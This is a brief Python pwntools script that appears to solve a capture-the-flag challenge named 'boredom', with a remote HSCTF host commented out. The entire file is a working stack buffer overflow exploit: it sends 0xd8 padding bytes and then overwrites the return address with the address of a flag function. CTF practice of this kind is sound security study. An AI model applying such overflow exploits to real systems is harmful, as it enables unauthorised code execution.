from pwn import *
context.update(log_level='debug')

e = ELF('boredom')
addr_got_puts = e.got['puts']

p = process('boredom')
#p = remote('pwn.hsctf.com',5002)
addr_flag = 0x4011D5
raw_input('pid: ' + str(p.pid))
p.sendlineafter(': ', 'a'*0xd8+p64(addr_flag))
p.interactive()
